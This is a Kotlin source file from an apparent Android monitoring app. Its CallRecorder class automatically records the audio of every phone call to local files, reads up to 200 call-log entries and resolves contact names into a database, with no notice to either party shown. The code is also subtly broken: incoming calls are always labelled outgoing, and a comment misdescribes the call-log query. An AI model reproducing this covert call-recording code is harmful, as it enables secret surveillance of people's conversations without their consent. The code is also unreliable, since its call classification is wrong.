package com.empresa.monitor.service.call

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import androidx.core.content.ContextCompat
import com.empresa.monitor.data.db.MonitorDatabase
import com.empresa.monitor.data.db.entity.CallRecordEntity
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class CallRecorder(private val context: Context) {

    private val db = MonitorDatabase.getInstance(context)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = false
    private var isRecording = false
    private var currentCallStartTime = 0L
    private var currentPhoneNumber: String? = null
    private var currentCallType: Int = 0
    private var audioRecord: AudioRecord? = null
    private var recordingFile: File? = null
    private val recordsDir: File

    private var phoneStateListener: PhoneStateListener? = null

    init {
        recordsDir = File(context.filesDir, "call_recordings")
        recordsDir.mkdirs()
    }

    fun startMonitoring() {
        if (isRunning) return
        isRunning = true
        registerPhoneStateListener()

        // Also capture existing call logs
        scope.launch { captureCallLog() }
    }

    fun stopMonitoring() {
        isRunning = false
        stopRecording()
        phoneStateListener?.let {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            tm?.listen(it, PhoneStateListener.LISTEN_NONE)
        }
        phoneStateListener = null
        scope.cancel()
    }

    private fun registerPhoneStateListener() {
        val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        phoneStateListener = object : PhoneStateListener() {
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_IDLE -> {
                        if (isRecording) {
                            stopRecording()
                            saveCallRecord()
                        }
                    }
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        // Call is active - start recording
                        currentCallStartTime = System.currentTimeMillis()
                        currentPhoneNumber = phoneNumber
                        currentCallType = if (currentCallStartTime > 0) 2 else 1 // 2=outgoing, 1=incoming
                        startRecording()
                    }
                    TelephonyManager.CALL_STATE_RINGING -> {
                        currentPhoneNumber = phoneNumber
                        currentCallType = 1 // incoming
                    }
                }
            }
        }

        tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
    }

    private fun startRecording() {
        if (!hasRecordAudioPermission()) return
        if (isRecording) return

        try {
            val sampleRate = 44100
            val channelConfig = AudioFormat.CHANNEL_IN_MONO
            val audioFormat = AudioFormat.ENCODING_PCM_16BIT
            val bufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat)

            recordingFile = File(recordsDir, "call_${System.currentTimeMillis()}.pcm")
            val outputStream = FileOutputStream(recordingFile)

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.VOICE_COMMUNICATION,
                sampleRate, channelConfig, audioFormat, bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                // Fallback to MIC if VOICE_COMMUNICATION not available
                audioRecord = AudioRecord(
                    MediaRecorder.AudioSource.MIC,
                    sampleRate, channelConfig, audioFormat, bufferSize
                )
            }

            audioRecord?.startRecording()
            isRecording = true

            scope.launch(Dispatchers.IO) {
                val buffer = ByteArray(bufferSize)
                while (isRecording && isActive) {
                    val bytesRead = audioRecord?.read(buffer, 0, buffer.size) ?: 0
                    if (bytesRead > 0) {
                        try {
                            outputStream.write(buffer, 0, bytesRead)
                        } catch (_: Exception) { break }
                    }
                }
                try { outputStream.close() } catch (_: Exception) {}
            }
        } catch (e: Exception) {
            e.printStackTrace()
            isRecording = false
        }
    }

    private fun stopRecording() {
        isRecording = false
        try {
            audioRecord?.stop()
            audioRecord?.release()
        } catch (_: Exception) {}
        audioRecord = null
    }

    private fun saveCallRecord() {
        val phoneNumber = currentPhoneNumber ?: "unknown"
        val duration = ((System.currentTimeMillis() - currentCallStartTime) / 1000).toInt()
        val fileSize = recordingFile?.length() ?: 0

        scope.launch {
            val entity = CallRecordEntity(
                callRecordId = "call_${currentCallStartTime}",
                phoneNumber = phoneNumber,
                contactName = getContactName(phoneNumber),
                callType = currentCallType,
                durationSeconds = duration,
                callDate = currentCallStartTime,
                hasAudioRecording = fileSize > 1000,
                audioFilePath = recordingFile?.absolutePath,
                fileSize = fileSize
            )
            db.callRecordDao().insert(entity)
        }

        currentPhoneNumber = null
        recordingFile = null
    }

    private suspend fun captureCallLog() {
        withContext(Dispatchers.IO) {
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    // Use TelecomManager for Android 12+
                    if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return@withContext

                    val cursor = context.contentResolver.query(
                        android.provider.CallLog.Calls.CONTENT_URI,
                        null, null, null,
                        "${android.provider.CallLog.Calls.DATE} DESC LIMIT 200"
                    )

                    cursor?.use { c ->
                        while (c.moveToNext()) {
                            val number = c.getString(c.getColumnIndex(android.provider.CallLog.Calls.NUMBER)) ?: ""
                            val type = c.getInt(c.getColumnIndex(android.provider.CallLog.Calls.TYPE))
                            val date = c.getLong(c.getColumnIndex(android.provider.CallLog.Calls.DATE))
                            val duration = c.getInt(c.getColumnIndex(android.provider.CallLog.Calls.DURATION))
                            val name = c.getString(c.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME))

                            val callRecord = CallRecordEntity(
                                callRecordId = "call_log_$date",
                                phoneNumber = number,
                                contactName = name ?: getContactName(number),
                                callType = type,
                                durationSeconds = duration,
                                callDate = date
                            )
                            db.callRecordDao().insert(callRecord)
                        }
                    }
                }
            } catch (e: Exception) { e.printStackTrace() }
        }
    }

    private fun getContactName(phone: String): String? {
        if (phone.isEmpty() || phone == "unknown") return null
        try {
            val uri = android.net.Uri.withAppendedPath(
                android.provider.ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
                android.net.Uri.encode(phone)
            )
            val cursor = context.contentResolver.query(uri,
                arrayOf(android.provider.ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    return it.getString(0)
                }
            }
        } catch (_: Exception) {}
        return null
    }

    private fun hasRecordAudioPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    }

    fun destroy() { stopMonitoring() }
}
